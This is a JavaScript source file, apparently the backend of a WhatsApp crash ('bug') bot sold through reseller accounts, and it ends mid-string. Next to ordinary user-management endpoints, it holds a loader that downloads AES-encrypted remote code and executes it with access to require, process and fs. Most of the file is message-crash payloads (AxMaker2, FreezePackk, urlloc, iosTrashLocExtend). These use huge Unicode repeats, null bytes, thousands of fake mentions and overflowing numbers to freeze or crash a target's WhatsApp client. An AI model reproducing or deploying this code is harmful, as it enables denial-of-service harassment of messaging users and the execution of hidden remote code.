  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const viewer = db.find(u => u.username === keyInfo.username);
  const viewerRole = normalizeRoleName(viewer?.role || "member");
  const allowedRoles = getAllowedCreateRoles(viewerRole);

  if (!viewer || allowedRoles.length === 0) {
    console.log(`[❌ LIST] ${viewer?.username || "Unknown"} tidak diizinkan melihat user list.`);
    return res.json({
      valid: true,
      authorized: false,
      message: `Role '${viewerRole}' tidak bisa melihat daftar user.`,
    });
  }

  const users = db
    .filter(u => allowedRoles.includes(normalizeRoleName(u.role || "member")))
    .map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: normalizeRoleName(u.role || "member"),
    }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role = "member", day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");
  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (db.find(u => u.username === username)) {
    console.log("[✘ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: requestedRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
        { parse_mode: "Markdown" }
    );

  const logLine = `${creator.username} Created ${newUser.username} Role ${requestedRole} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[✘ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[✘ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[✘ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[✘ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("✘ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function AxMaker2(sock, target) {
  const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 99999999,
         expectedVideoCount: 0, 
      }
   }, {});
  
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " #1stRaldzz€xe ", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "menu_options", 
            paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #1stRaldzz€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }
  };

  const msg4 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(60000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "support@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ],
               messageAssociation: {
                 associationType: 1,
                 parentMessageKey: album.key
               }
             }
           }
         };

    let msg5 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " #1stRaldzz€xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            statusAttributionType: "SHARED_FROM_MENTION",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              ),
            ]
          }
        }
      }
    }
  }, {});
  
  const msg6 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(60000),
      publisher: "ꦾ".repeat(60000),
      caption: " ### ",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        }
      ],
      fileLength: "999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
       remoteJid: "X",
       participant: "0@s.whatsapp.net",
       stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "0@s.whatsapp.net",
             ...Array.from({ length: 1990 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "support@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  }, {});

  for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
  }
}

async function FreezePackk(tdx, target) {
  await tdx.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(70000),
      publisher: "𝐂𝐫𝐢𝐭𝐢𝐜𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤" + "ꦾ".repeat(500),
      stickers: [],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135550202@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}

async function urlloc(client, target) { 
  const triggerUI = "ꦾ".repeat(61111);
  await client.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        url: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        thumbnailUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        waWebSocketUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        mediaUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        sourceUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        originalImageUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"@s.whatsapp.net"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: triggerUI,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1990 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
              ],
          stanzaId: client.generateMessageTag(),
          virtexId: client.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function iosTrashLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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